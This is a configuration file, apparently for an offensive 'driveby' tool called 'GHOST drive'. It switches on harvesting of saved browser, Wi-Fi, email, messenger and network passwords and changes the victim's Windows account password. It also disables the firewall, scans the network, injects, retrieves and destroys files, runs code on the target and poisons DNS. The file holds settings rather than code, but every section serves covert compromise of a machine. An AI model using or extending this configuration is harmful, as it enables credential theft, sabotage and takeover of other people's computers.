# configuration file for controlling the driveby
# main control type binary [1 - 0]; exception: direct input
# For direct input use _blank_("") as "null" value and NOT null and whitespaces

# ->initializing controls
exec_mode = "normal"
uac_elevation = 0
duplicate_exec = 1

# ->completion controls
msgbox = {
    'controller': 0,
    'title': "GHOST drive",
    'msg': "Driveby complete !!!",
    'buttons': 0
}
power = {
    'controller': 0,
    'mode': "s",
    'comment': "a message",
    'timeout': "999"
}

# ->password recovery
browser_pwds = 1
wireless_keys = 1
email_pst_pwds = 1
mail_pwds = 1
network_pwds = 1
msn_pwds = 1
dialup_pwds = 1

# ->password moding
change_nt_pwd = {
    'current_acc_controller': 1,
    'current_acc_pwd': "windows password",
    'diff_acc_controller': 0,
    'diff_acc_usr': "username",
    'diff_acc_pwd': "a password"
}

# ->information gathering
batch_info = 1
network_scan = 1

# ->network based execs
deactivate_firewall = 1
activate_firewall = 1
release_ip_adapters = 1
renew_ip_adapters = 1


# ->file utilities
injector = {
    'controller': 1,
    'path': ""
}
retriever = {
    'controller': 1,
    'path': ""
}
destroyer = {
    'controller': 1,
    'path': ""
}

# ->custom executions
local_exec = 1
target_exec = {
    'controller': 1,
    'path': ""
}

# ->DNS poisoning
dns_poison = {
    'controller': 1,
    'entries': "" # research array inside an array
}